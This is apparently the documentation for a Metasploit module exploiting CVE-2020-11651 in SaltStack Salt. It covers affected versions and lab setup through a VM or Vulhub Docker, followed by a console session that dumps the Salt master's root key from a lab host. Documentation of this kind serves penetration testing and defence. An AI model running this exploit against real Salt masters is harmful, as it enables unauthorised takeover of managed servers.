## Vulnerable Application

### Description

This module exploits unauthenticated access to the `_prep_auth_info()`
method in the SaltStack Salt master's ZeroMQ request server, for
versions 2019.2.3 and earlier and 3000.1 and earlier, to disclose the
root key used to authenticate administrative commands to the master.

VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as
well as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual
Internet Routing Lab Personal Edition (VIRL-PE), for versions 1.2,
1.3, 1.5, and 1.6 in certain configurations, are known to be affected
by the Salt vulnerabilities.

Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as
well as Vulhub's Docker image.

### Setup

**Note:** I did the bulk of my testing after manually installing Salt in
an [Ubuntu 18.04 VM](#using-a-virtual-machine), but the [Docker image
from Vulhub](#using-docker) may be quicker. YMMV.

#### Using a virtual machine

1. Set up an Ubuntu 18.04 VM
2. Browse to [SaltStack's instructions for
   Ubuntu](https://repo.saltstack.com/#ubuntu)
3. Select `Pin to Minor Release` and change all versions to either
   **2019.2.3** or **3000.1**, depending on the version you wish to test
4. Follow the instructions, installing only the `salt-master` and
   `salt-minion` packages necessary for testing
5. Follow the [post-installation
   configuration](https://docs.saltstack.com/en/latest/ref/configuration/index.html)

You may now begin testing.

#### Using Docker

**Prerequisites:** [Docker](https://docs.docker.com/get-docker/) and
[Docker Compose](https://docs.docker.com/compose/install/) must be
installed first.

**Note:** The Salt master is already configured and running in the
following scenario. The majority of the steps below are for configuring
and starting the minion. Version **2019.2.3** will be used.

1. Run `git clone https://github.com/vulhub/vulhub`
2. Run `cd vulhub/saltstack/CVE-2020-11651`
3. Run `docker-compose up -d` to start the container in the background
4. Run `docker exec -it cve-2020-11651_saltstack_1 bash` to drop to a
   root shell inside the container
5. Run `echo $'127.0.0.1\tsalt' >> /etc/hosts` to add the master to
   `/etc/hosts` (this allows the minion to find the master)
6. Run `salt-minion -d` to execute the minion in the background
7. Run `salt-key -A` and accept the key for the minion

You may now begin testing.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Actions

### Dump

This dumps the Salt master's root key by sending the `_prep_auth_info()`
method and extracting the key from the resulting serialized auth info.

## Scenarios

### SaltStack Salt 2019.2.3 on Ubuntu 18.04

```
msf5 > use auxiliary/gather/saltstack_salt_root_key
msf5 auxiliary(gather/saltstack_salt_root_key) > options

Module options (auxiliary/gather/saltstack_salt_root_key):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   4506             yes       The target port (TCP)


Auxiliary action:

   Name  Description
   ----  -----------
   Dump  Dump root key from Salt master


msf5 auxiliary(gather/saltstack_salt_root_key) > set rhosts 172.28.128.5
rhosts => 172.28.128.5
msf5 auxiliary(gather/saltstack_salt_root_key) > run
[*] Running module against 172.28.128.5

[*] 172.28.128.5:4506 - Connecting to ZeroMQ service at 172.28.128.5:4506
[*] 172.28.128.5:4506 - Negotiating signature
[+] 172.28.128.5:4506 - Received valid signature: "\xFF\x00\x00\x00\x00\x00\x00\x00\x01\x7F"
[*] 172.28.128.5:4506 - Sending identical signature
[*] 172.28.128.5:4506 - Negotiating version
[+] 172.28.128.5:4506 - Received compatible version: "\x03"
[*] 172.28.128.5:4506 - Sending identical version
[*] 172.28.128.5:4506 - Negotiating NULL security mechanism
[+] 172.28.128.5:4506 - Received NULL security mechanism
[*] 172.28.128.5:4506 - Sending NULL security mechanism
[*] 172.28.128.5:4506 - Sending READY command of type REQ
[+] 172.28.128.5:4506 - Received READY reply of type ROUTER
[*] 172.28.128.5:4506 - Yeeting _prep_auth_info() at 172.28.128.5:4506
[+] 172.28.128.5:4506 - Received serialized auth info
[+] 172.28.128.5:4506 - Root key: bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=
[*] 172.28.128.5:4506 - Disconnecting from 172.28.128.5:4506
[*] Auxiliary module execution completed
msf5 auxiliary(gather/saltstack_salt_root_key) > creds
Credentials
===========

host          origin        service                 public  private                                                                       realm  private_type  JtR Format
----          ------        -------                 ------  -------                                                                       -----  ------------  ----------
172.28.128.5  172.28.128.5  4506/tcp (salt/zeromq)  root    bv2Ra72DXzkrbFVYNPHrOe9CqM2aKBdl+E46/m/kaxvDsiLxhG+0PS55u704MyOi2/PgD/EadGk=         Password

msf5 auxiliary(gather/saltstack_salt_root_key) >
```
